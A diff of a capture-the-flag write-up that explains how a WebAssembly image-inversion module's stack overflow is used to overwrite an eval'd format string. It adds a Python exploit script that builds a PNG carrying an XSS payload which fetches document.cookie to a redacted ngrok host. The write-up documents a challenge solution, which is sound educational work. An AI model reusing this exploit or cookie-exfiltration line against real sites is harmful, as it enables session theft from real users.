@@ -100,33 +100,79 @@ app.use(bodyParser.urlencoded({limit: '10kb', extended: true}));
 
 So if we want to steal the cookie when the bot looks at our picture, we have to hide our request in the bytes of the image. But wait - the hidden JS probably won't be interpreted as code, so even if we do stego JS into our picture, how will we know it'll execute? 
 
-## Oh boy, I hope you like wasm
+## Reversing the Wasm
 
-The wasm file is the logic behind the pixel color inversion. After 10 mins of reinstalling Ghidra, we can observe the output of decompiling the wasm - but first, observe the `a.out.js` files accompanying it. More specifically, observe this function: 
+If an image is provided for inversion, `index.js` passes the raw binary data to `draw_u8a`, which allocates a block of memory inside the Wasm module using `malloc`, writes the raw PNG data there, and then calls the Wasm `draw_img` function.
+
+Using Ghidra and the [Ghidra Wasm plugin](https://github.com/nneonneo/ghidra-wasm-plugin/), we can disassemble the `draw_img` function, which looks like this:
+
+```c
+// WARNING: Removing unreachable block (ram,0x80000608)
+// WARNING: Removing unreachable block (ram,0x8000063c)
+
+void export::draw_img(void *pngbuf,undefined4 pnglen)
+
+{
+  state *param1;
+  uint uVar1;
+  undefined4 in_stack_ffd23918;
+  undefined4 in_stack_ffd2391c;
+  uint in_stack_ffd2392c;
+  
+  param1 = (state *)unnamed_function_51(0);
+  unnamed_function_53(param1,pngbuf,pnglen);
+  unnamed_function_57(param1,&stack0xffd23918);
+  unnamed_function_55(param1,1,&stack0xffd2392c);
+  unnamed_function_37(param1,&stack0xffd23930,in_stack_ffd2392c,1,0);
+  for (uVar1 = 0; uVar1 < in_stack_ffd2392c; uVar1 += 1) {
+    if ((int)uVar1 % 4 != 3) {
+      (&stack0xffd23930)[uVar1] = (&stack0xffd23930)[uVar1] ^ 0xff;
+    }
+  }
+  draw_buf(&stack0xffd23930,in_stack_ffd23918,in_stack_ffd2391c);
+  return;
+}
+```
+
+There are several function calls which appear to be doing PNG decompression, followed by a loop which performs the actual inversion operation by inverting the R, G, and B components of every RGBA quartet. From the function prologue, we can see that 3000048 bytes are allocated on the C stack, which is enough for 1000000 RGB triples - but this code now supports alpha (as the site proudly proclaims). Therefore, we have a buffer overflow: the buffer used to be big enough for RGB images up to 1000x1000, but a 1000x1000 RGBA image contains 4000000 bytes, enough to overflow this stack buffer.
+
+After performing the inversion, `draw_img` calls `draw_buf`, which formas the string `draw_buf(%u, %u, %u);` and passes it to `emscripten_run_script`. `emscripten_run_script` in `a.out.js` lets us run arbitrary JS as follows:
 
 ```js
   function _emscripten_run_script(ptr) {
       eval(UTF8ToString(ptr));
     }
 ```
-A call to eval on some sort of variable which is, presumably, a string from a UTF8 variable. The `UTF8ToString` function itself calls `UTF8ArrayToString`, which has an interesting if statement:
 
-```js
-//UTF8ArrayToString()
-if (endPtr - idx > 16 && heap.subarray && UTF8Decoder) {
-    return UTF8Decoder.decode(heap.subarray(idx, endPtr));
-  } else {
-    ...
-```
+`global_0` holds the stack pointer, which is initialized to 0x500000. The static string `draw_buf(%u, %u, %u)` is located at 0x500056. Therefore, if we overflow the stack, we can overwrite the format string, which will allow us to control the string that's passed into `_emscripten_run_script` and give us arbitrary script execution. Sounds like just what we need then!
 
-Truthy value to this if statement returns a decoded string located at the subarray between the address of `idx` and `endPtr`. Whatever's in there on the stack will, eventually, be run as JS code. 
+We built an image of size 894x839, which contains 3000264 bytes of image data - just enough to overflow the buffer and the format string, without overflowing too much data in the binary and risking corruption. Using `pwn.cyclic`, we overflowed the stack using a de Bruijn sequence, and verified using the WebAssembly debugger in Firefox that the format string was being overwritten - but `_emscripten_run_script` wasn't getting called at all!
 
-TODO: stop being afraid of ghidra and  add stuff here
-
-A 3M byte stack buffer is set, with size checks expecting a max of 1000x1000 RGB triples. However, the logic supports RGBA (RGB Alpha) - meaning that the max buffer size is an additional 1M to accomodate the opacity bytes, totaling to 4M. If we give the program an image that is over 3M RGBA bytes but less than 4M, we trigger an overflow whilst never triggering the size checks.
-
-When an overflow occurs, the extra bytes end up overwriting the string `draw_buf(%u, %u, %u)` which is the name of an actual function defined in `index.js`. The original logic would have passed that string to `_emscripten_run_script`, eval'ing it as JavaScript code. However, overflowing into it will change the string that's passed into `_emscripten_run_script`. Sounds like just what we need then!
+Single-step debugging revealed that `draw_img` was bailing out in an extra code block between the `for` loop and the `draw_buf` - which Ghidra had happily deleted as "unreachable"! It turns out that this code checks two 32-bit values on the stack as a simple kind of "stack canary"; since the values would not normally change, Ghidra decided that the checks were redundant. By checking the loaded canary values with `pwn.cyclic_find`, we were able to figure out the correct offsets in our image data, set the proper canaries, and watch `eval` get called!
 
 ## Solution
 
-The attack flow is now clear: we just need need to create an image which, when decoded, is a little over 3M bytes and overflow the allocated buffer. The remaining bytes that spill into the string `draw_buf` will be a string that represents JS code. Therefore, when the logic passes it to `_emscripten_run_script()`, it doesn't eval `draw_buf()`, it evals our XSS payload instead. 
+The attack flow is now clear: we just need need to create an image which, when decoded, is a little over 3M bytes and overflow the allocated buffer, with the proper stack canaries in place. The remaining bytes that spill into the string `draw_buf` will be a string that represents JS code. Therefore, when the logic passes it to `_emscripten_run_script()`, it doesn't eval `draw_buf()`, it evals our XSS payload instead. 
+
+Here's our exploit script:
+
+```python
+import numpy as np
+from PIL import Image
+import pwn
+import struct
+
+payload = "fetch('https://redacted.ngrok.io/?c='+(document.cookie));"
+
+payload = payload.encode() + b"\0"
+arr = np.zeros((839, 894, 4), dtype='uint8')
+row = bytearray(pwn.cyclic(894 * 4 - 1) + b'\0')
+row[3312:3316] = struct.pack("<I", 0x42042042)
+row[3316:3320] = struct.pack("<I", 0xdeadbeef)
+row[3414:3414 + len(payload)] = payload
+row = np.asarray(list(row))
+arr[:, :, 3] = 0xff
+arr[-1] = row.reshape((-1, 4))
+arr[:, :, :3] ^= 0xff
+Image.fromarray(arr).save("exploit.png")
+```
